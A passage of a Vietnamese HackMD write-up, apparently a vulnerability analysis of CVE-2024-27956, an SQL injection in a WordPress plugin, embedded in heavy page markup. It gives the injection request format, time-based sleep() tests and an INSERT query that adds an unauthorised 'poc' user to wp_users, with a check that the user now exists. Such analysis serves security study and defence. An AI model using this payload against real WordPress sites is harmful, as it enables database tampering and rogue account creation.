data-size="7">Payload</span></h2><p class="part" data-startline="106" data-endline="106" data-position="2984" data-size="0"><span data-position="2984" data-size="30">Payload để exploit sẽ có dạng:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="108" data-endline="110" data-infoprefix-length="0" data-position="3016"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code>q=[query]&amp;auth=%20&amp;integ=[md5(query)]
</code></pre>
      </div><h3 class="part" data-startline="112" data-endline="112" id="Kiểm-tra-lỗ-hổng" data-id="Kiểm-tra-lỗ-hổng"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Ki%E1%BB%83m-tra-l%E1%BB%97-h%E1%BB%95ng" title="Kiểm-tra-lỗ-hổng" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="3067" data-size="16">Kiểm tra lỗ hổng</span></h3><p class="part" data-startline="114" data-endline="114" data-position="3085" data-size="0"><span data-position="3085" data-size="78">Câu truy vấn sql để kiểm tra xem server có thực thi câu truy vấn mà ta gửi lên</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="115" data-endline="117" data-infoprefix-length="4" data-position="3164"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap sql hljs"><span class="hljs-keyword">SELECT</span> IF(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">0</span>))
</code></pre>
      </div><p class="part" data-startline="119" data-endline="119" data-position="3210" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="3210" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/HJx53IyGA.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="3210" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="121" data-endline="121" data-position="3262" data-size="0"><span data-position="3262" data-size="52">=&gt; Quan sát thấy server trả về response ngay lập tức</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="123" data-endline="125" data-infoprefix-length="4" data-position="3316"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap sql hljs"><span class="hljs-keyword">SELECT</span> IF(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">0</span>))
</code></pre>
      </div><p class="part" data-startline="127" data-endline="127" data-position="3362" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="3362" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/H1ikT8kGR.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="3362" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="129" data-endline="129" data-position="3414" data-size="0"><span data-position="3414" data-size="71">=&gt; Quan sát thấy server mất một lúc (khoảng 5 giây) mới trả về response</span></p><h3 class="part" data-startline="131" data-endline="131" id="Tạo-một-user-Wordpress-mới" data-id="Tạo-một-user-Wordpress-mới"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#T%E1%BA%A1o-m%E1%BB%99t-user-Wordpress-m%E1%BB%9Bi" title="Tạo-một-user-Wordpress-mới" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="3491" data-size="26">Tạo một user Wordpress mới</span></h3><p class="part" data-startline="133" data-endline="133" data-position="3519" data-size="0"><span data-position="3519" data-size="15">Kiểm tra table </span><code data-position="3535" data-size="8">wp_users</code><span data-position="3544" data-size="24"> hiện tại chỉ có 1 user </span><code data-position="3569" data-size="5">admin</code></p><p class="part" data-startline="135" data-endline="135" data-position="3577" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="3577" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/rkdG1wkGR.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="3577" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="137" data-endline="137" data-position="3629" data-size="0"><span data-position="3629" data-size="39">Câu truy vấn để tạo user mới vào table </span><code data-position="3669" data-size="8">wp_users</code><span data-position="3678" data-size="1">:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="139" data-endline="141" data-infoprefix-length="4" data-position="3681"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap sql hljs"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'poc'</span>, MD5(<span class="hljs-string">'poc'</span>), <span class="hljs-string">'poc'</span>, <span class="hljs-string">'poc@localhost.org'</span>, NOW(), <span class="hljs-number">0</span>)
</code></pre>
      </div><p class="part" data-startline="143" data-endline="143" data-position="3861" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="3861" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/ryht1PJz0.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="3861" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="145" data-endline="145" data-position="3913" data-size="0"><span data-position="3913" data-size="46">Kiểm tra lại database thấy đã có thêm user mới</span></p><p class="part" data-startline="147" data-endline="147" data-position="3962" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="3962" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/rJ1LxP1zA.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="3962" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><h3 class="part" data-startline="149" data-endline="149" id="Kiểm-tra-user-vừa-tạo-tồn-tại-trong-table" data-id="Kiểm-tra-user-vừa-tạo-tồn-tại-trong-table"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Ki%E1%BB%83m-tra-user-v%E1%BB%ABa-t%E1%BA%A1o-t%E1%BB%93n-t%E1%BA%A1i-trong-table" title="Kiểm-tra-user-vừa-tạo-tồn-tại-trong-table" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="4018" data-size="41">Kiểm tra user vừa tạo tồn tại trong table</span></h3><p class="part" data-startline="151" data-endline="151" data-position="4061" data-size="0"><span data-position="4061" data-size="21">Dựa theo source code:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="153" data-endline="186" data-infoprefix-length="4" data-position="4084"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="php hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span></div><div class="code"><span class="hljs-variable">$rows</span>=<span class="hljs-variable">$wpdb</span>-&gt;get_results( <span class="hljs-variable">$q</span>);
<span class="hljs-variable">$date</span>=date(<span class="hljs-string">"F j, Y, g:i a s"</span>);
<span class="hljs-variable">$fname</span>=md5(<span class="hljs-variable">$date</span>);
header(<span class="hljs-string">"Content-type: application/csv"</span>);
header(<span class="hljs-string">"Content-Disposition: attachment; filename=<span class="hljs-subst">$fname</span>.csv"</span>);
header(<span class="hljs-string">"Pragma: no-cache"</span>);
header(<span class="hljs-string">"Expires: 0"</span>);

  <span class="hljs-keyword">echo</span> <span class="hljs-string">"DATE,ACTION,DATA,KEYWORD \n"</span>;
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$rows</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>){
	
	<span class="hljs-variable">$action</span>=<span class="hljs-variable">$row</span>-&gt;action;
	<span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$action</span> , <span class="hljs-string">'New Comment Posted on :'</span>)){
			<span class="hljs-variable">$action</span> = <span class="hljs-string">'Posted Comment'</span>;
		}<span class="hljs-keyword">elseif</span>(stristr(<span class="hljs-variable">$action</span> , <span class="hljs-string">'approved'</span>)){
			<span class="hljs-variable">$action</span> = <span class="hljs-string">'Approved Comment'</span>;
	}
	
	<span class="hljs-comment">//format date</span>
	<span class="hljs-variable">$date</span>=date(<span class="hljs-string">'Y-n-j H:i:s'</span>,strtotime (<span class="hljs-variable">$row</span>-&gt;date));

	<span class="hljs-variable">$data</span>=<span class="hljs-variable">$row</span>-&gt;data;
	<span class="hljs-variable">$keyword</span>=<span class="hljs-string">''</span>;
	<span class="hljs-comment">//filter the data strip keyword</span>
	<span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$data</span>,<span class="hljs-string">';'</span>)){
		<span class="hljs-variable">$datas</span>=explode(<span class="hljs-string">';'</span>,<span class="hljs-variable">$row</span>-&gt;data);
		<span class="hljs-variable">$data</span>=<span class="hljs-variable">$datas</span>[<span class="hljs-number">0</span>];
		<span class="hljs-variable">$keyword</span>=<span class="hljs-variable">$datas</span>[<span class="hljs-number">1</span>];
	}
	  <span class="hljs-keyword">echo</span> <span class="hljs-string">"<span class="hljs-subst">$date</span>,<span class="hljs-subst">$action</span>,<span class="hljs-subst">$data</span>,<span class="hljs-subst">$keyword</span> \n"</span>;

}
</div></div></code></pre>
      </div><p class="part" data-startline="188" data-endline="188" data-position="4866" data-size="0"><span data-position="4866" data-size="39">=&gt; Truy vấn trả về row thì sẽ hiện date</span></p><p class="part" data-startline="190" data-endline="190" data-position="4907" data-size="0"><span data-position="4907" data-size="39">Câu truy vấn một user không có trong db</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="191" data-endline="193" data-infoprefix-length="4" data-position="4947"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `wp_users` <span class="hljs-keyword">WHERE</span> user_login<span class="hljs-operator">=</span><span class="hljs-string">'abc'</span>
</code></pre>
      </div><p class="part" data-startline="195" data-endline="195" data-position="5008" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="5008" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/BJaxNDkM0.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="5008" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="197" data-endline="197" data-position="5060" data-size="0"><span data-position="5060" data-size="71">=&gt; Quan sát thấy do không có row nào thoả điều kiện nên không hiện date</span></p><p class="part" data-startline="199" data-endline="199" data-position="5133" data-size="0"><span data-position="5133" data-size="5">Thay </span><code data-position="5139" data-size="10">user_login</code><span data-position="5150" data-size="12"> thành user </span><code data-position="5163" data-size="3">poc</code><span data-position="5167" data-size="8"> vừa tạo</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="201" data-endline="203" data-infoprefix-length="4" data-position="5177"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `wp_users` <span class="hljs-keyword">WHERE</span> user_login<span class="hljs-operator">=</span><span class="hljs-string">'poc'</span>
</code></pre>
      </div><p class="part" data-startline="205" data-endline="205" data-position="5238" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="5238" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent 